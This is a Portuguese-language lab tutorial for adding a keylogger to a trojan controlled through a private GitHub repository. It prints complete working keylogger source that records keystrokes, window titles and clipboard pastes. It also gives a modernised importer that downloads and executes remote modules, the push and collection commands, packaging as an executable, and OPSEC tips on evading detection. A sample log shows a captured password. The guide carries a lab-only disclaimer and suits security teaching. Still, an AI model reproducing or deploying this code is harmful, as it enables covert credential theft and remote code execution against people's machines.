# Guia Prático Completo: Integrando Keylogger ao Trojan GitHub

**Laboratório Prático:** BHT Lab — Kali (atacante) + VM Windows (vítima) + repo privado `bhtprojan`
**Ambiente de Testes:** Python 3.6–3.11 + `github3.py`, `pyWinhook`, `pywin32` (para 3.12+ use `git_trojan_moderno.py`)
**Código de Apoio:** `modules/keylogger.py` (adaptado), `git_trojan_moderno.py`, `decodificar_resultado.py`
**Fonte fiel:** `tutorial-integracao-keylogger-github-trojan.md.md`

---

> ⚠️ **Aviso de Responsabilidade e Ética Profissional**
> Execute apenas com repositório **privado**, token de teste de curta validade e VMs de laboratório, com autorização do professor.
> Nunca suba `mytoken.txt` para o GitHub. Revogue o token ao final da aula.
> Qualquer execução contra sistemas de terceiros sem autorização prévia por escrito é ilegal, nos termos do **Marco Civil da Internet (Lei nº 12.965/2014)** e do **Artigo 154-A do Código Penal Brasileiro**.

---

## 1. O Conceito: Carregador Modular

O trojan do Cap. 7 **não contém** keylogging — ele apenas:

```text
+-----------------+         +------------------+         +-----------------+
|  ATACANTE (Kali)|         |  GITHUB bhtprojan|         |  VÍTIMA (Win)   |
|                 | push    |  config/abc.json |  baixa  |  git_trojan.py  |
|  git push ------+-------->|  modules/        +<--------+  importa + run()|
|                 |         |   keylogger.py   |         |  10 min captura |
|  git pull <-----+---------|  data/abc/*.data +<--------+  envia base64   |
|  base64 -d      |         |                  |         |  dorme 30m–3h   |
+-----------------+         +------------------+         +-----------------+
```

1. Lê `config/abc.json` do GitHub.
2. Para cada módulo, importa de `modules/<nome>.py`.
3. Chama `run()` do módulo.
4. Envia o retorno para `data/<id>/<timestamp>.data`.

> 💡 **Para instalar o keylogger você NÃO copia para a vítima.** Coloca no GitHub, adiciona `"keylogger"` ao `abc.json` e dá `git push`. O trojan puxa sozinho.

---

## 2. Pré-requisitos

### A. Na máquina atacante (Kali)
* Git + Python 3.6–3.11 (o `GitImporter` original usa API antiga; para 3.12+ veja §7).
* Conta GitHub + repo `bhtprojan` **privado**.
* Token clássico com escopo `repo`.

### B. Na máquina vítima (Windows, VM de lab)
```cmd
pip install github3.py pyWinhook pywin32
```
* `github3.py` → GitHub | `pyWinhook` → hooks | `pywin32` → clipboard/COM.
* Opcional: `pip install pyinstaller` para gerar `.exe` (`dist\`).

---

## 3. Estrutura do Repositório

```text
bhtprojan/
├── .gitignore
├── config/
│   └── abc.json
├── modules/
│   ├── dirlister.py
│   ├── environment.py
│   └── keylogger.py     <-- NOVO
└── data/
    └── abc/             <-- resultados enviados pelo trojan
```

---

## 4. Análise Linha a Linha: Passo 1 (Token) e Passo 2 (Keylogger Adaptado)

### 4.1 Token + `.gitignore`

```bash
echo "ghp_xxxxxxxxxxxxxxxxxxxx" > mytoken.txt
echo "mytoken.txt" >> .gitignore
```

| Linha | Instrução | Finalidade Técnica |
| :---: | :--- | :--- |
| `> mytoken.txt` | Salva token fora do git | Evita vazar credencial com `push`. |
| `>> .gitignore` | Ignora no versionamento | Se vazar, qualquer um lê/apaga seus dados. |

### 4.2 `modules/keylogger.py` adaptado (padrão `run(**args)` + tempo de parede)

```python
 1 | from ctypes import byref, create_string_buffer, c_ulong, windll
 2 | from io import StringIO
 3 |
 4 | import pythoncom
 5 | import pyWinhook as pyHook
 6 | import sys
 7 | import time
 8 | import win32clipboard
 9 |
10 | TIMEOUT = 60 * 10  # 10 minutos
11 |
12 | class KeyLogger:
13 |     def __init__(self):
14 |         self.current_window = None
15 |
16 |     def get_current_process(self):
17 |         hwnd = windll.user32.GetForegroundWindow()
18 |         pid = c_ulong(0)
19 |         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
20 |         process_id = f'{pid.value}'
21 |         executable = create_string_buffer(512)
22 |         h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
23 |         windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
24 |         window_title = create_string_buffer(512)
25 |         windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
26 |         try:
27 |             self.current_window = window_title.value.decode()
28 |         except UnicodeDecodeError as e:
29 |             print(f'{e}: window name unknown')
30 |         print('\n', process_id, executable.value.decode(), self.current_window)
31 |         windll.kernel32.CloseHandle(hwnd)
32 |         windll.kernel32.CloseHandle(h_process)
33 |
34 |     def mykeystroke(self, event):
35 |         if event.WindowName != self.current_window:
36 |             self.get_current_process()
37 |         if 32 < event.Ascii < 127:
38 |             print(chr(event.Ascii), end='')
39 |         else:
40 |             if event.Key == 'V':
41 |                 win32clipboard.OpenClipboard()
42 |                 value = win32clipboard.GetClipboardData()
43 |                 win32clipboard.CloseClipboard()
44 |                 print(f'[PASTE] - {value}')
45 |             else:
46 |                 print(f'[event.Key]')
47 |         return True
48 |
49 | def run(**args):
50 |     """Entry point chamado pelo git_trojan.module_runner()."""
51 |     save_stdout = sys.stdout
52 |     sys.stdout = StringIO()
53 |     kl = KeyLogger()
54 |     hm = pyHook.HookManager()
55 |     hm.KeyDown = kl.mykeystroke
56 |     hm.HookKeyboard()
57 |     start = time.time()
58 |     while (time.time() - start) < TIMEOUT:
59 |         pythoncom.PumpWaitingMessages()
60 |     log = sys.stdout.getvalue()
61 |     sys.stdout = save_stdout
62 |     return log
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `49` | `def run(**args):` | Convenção do C2 (`module_runner` chama sem args, mas aceita futuros via JSON). |
| `51–52` | `stdout → StringIO` | Captura prints do hook em string para enviar ao GitHub. |
| `57–59` | `start + time.time() - start` | **Correção:** tempo de parede, não CPU (`thread_time` travava horas). |
| `60–62` | `getvalue + restaura + return` | Devolve log para `store_module_result`. |

| Original | Adaptado | Motivo |
| :--- | :--- | :--- |
| `def run():` | `def run(**args):` | Padrão dos módulos do livro. |
| `while thread_time() < TIMEOUT` | `start = time.time(); while time.time()-start < TIMEOUT` | `thread_time` é CPU, não parede. |
| `import os` | removido | Não usado. |

---

## 5. Análise Linha a Linha: Passos 3–7 (Config, Push, Vítima, Execução, Coleta)

### 5.1 Passo 3 — `config/abc.json` com 3 módulos

```json
[
  { "module": "dirlister" },
  { "module": "environment" },
  { "module": "keylogger" }
]
```

| Elemento | Finalidade Técnica |
| :--- | :--- |
| `{ "module": "keylogger" }` | Faz `exec("import keylogger")` acionar `GitImporter` para `modules/keylogger.py`. |

### 5.2 Passo 4 — Push (atacante)

```bash
git add modules/keylogger.py config/abc.json
git commit -m "Adds keylogger module"
git push origin master
```

| Linha | Finalidade Técnica |
| :--- | :--- |
| `git add + commit + push` | Publica código e config. Confirmar no navegador. Senha = token. |

### 5.3 Passos 5–6 — Vítima + execução

```cmd
C:\> pip install github3.py pyWinhook pywin32
C:\> python git_trojan.py
```

**Saída esperada:**
```text
[*] Attempting to retrieve dirlister
[*] Attempting to retrieve environment
[*] Attempting to retrieve keylogger
[*] In dirlister module.
[*] In environment module.
```

| Etapa interna | O que acontece |
| :--- | :--- |
| `sys.meta_path.append(GitImporter())` | Registra importador. |
| `get_config()` | Baixa JSON, b64decode, `exec import` por módulo. |
| `find_module('keylogger')` | Baixa `modules/keylogger.py`, b64decode, retorna `self`. |
| `load_module` | `spec + module_from_spec + exec + sys.modules`. |
| `module_runner('keylogger')` | Roda 10 min, retorna string. |
| `store_module_result` | Cria `data/abc/<timestamp>.data` em base64. Trojan dorme 30m–3h. |

Para `.exe`: `pyinstaller -F git_trojan.py` → `dist\` (~7 MB, pode ser flagged por AV).

### 5.4 Passo 7 — Coleta (atacante)

```bash
git pull origin master
ls data/abc/
cat data/abc/2026-09-24T14-32-11.data | base64 -d
```

```python
import base64
with open('data/abc/2026-09-24T14-32-11.data', 'rb') as f:
    raw = f.read()
print(base64.b64decode(raw).decode('utf-8'))
```

| Linha | Finalidade Técnica |
| :--- | :--- |
| `git pull` | Baixa `.data` criados pelo trojan. |
| `base64 -d` | Decodifica: `"'[1234 notepad.exe] ola mundo[PASTE] - senha123'"`. |

---

## 6. Solução de Problemas (Troubleshooting)

| Erro | Causa | Correção |
| :--- | :--- | :--- |
| `cannot import spec_from_module` | Nome errado no livro | Usar `spec_from_loader` (veja §7). |
| `find_module() missing arg` / silencioso em 3.12+ | `find_module`/`load_module` removidos | Usar `find_spec`/`exec_module` (`git_trojan_moderno.py`). |
| `NotFoundError` no `create_file` | `github3.py` novo espera sem base64 | Tentar `create_file(path, msg, bindata)` sem `b64encode`. |
| Keylogger vazio | Sem admin / `TIMEOUT` curto / `pyWinhook` ausente | Rodar como admin, `pip show pyWinhook`, aumentar `TIMEOUT`. |
| `UnicodeDecodeError` | Título com byte não-UTF8 | `.decode('utf-8', errors='replace')`. |

---

## 7. Código Completo: `GitImporter` Modernizado (Python 3.12+)

```python
import importlib.abc
import importlib.util
import sys


class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, name, path=None, target=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return importlib.util.spec_from_loader(name, self)
        return None

    def create_module(self, spec):
        return None  # usa criação padrão

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)
```

```python
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
```

| Linhas | Finalidade Técnica |
| :--- | :--- |
| `find_spec` | Substitui `find_module`; retorna `spec_from_loader` ou `None`. |
| `create_module → None` | Usa criação padrão de módulo. |
| `exec_module` | Substitui `load_module`; executa código no namespace. |

---

## 8. Considerações de Segurança (OPSEC)

* **Token por trojan:** Se um vazar, revoga só aquele.
* **Repo privado obrigatório:** Público expõe módulos e logs.
* **Base64 ≠ criptografia:** Use Cap. 9 (AES+RSA) antes de enviar em produção de lab avançado.
* **Tráfego HTTPS para GitHub:** Passa por proxy comum, mas pode ser bloqueado — teste antes.
* **Sleep aleatório + `.exe`:** Reduz padrão de rede; `.exe` evita Python na vítima mas pesa ~7 MB e chama AV.

## 9. Resumo do Fluxo

```text
[Atacante]                    [GitHub]                     [Vítima]
    |                             |                             |
    |-- push keylogger.py ------->|                             |
    |-- push abc.json ----------->|                             |
    |                             |<---- baixa abc.json --------|
    |                             |<---- baixa keylogger.py ----|
    |                             |                             |-- executa 10 min
    |                             |<---- envia log -------------|
    |<---- git pull --------------|                             |
    |-- base64 -d ----------------|                             |
```
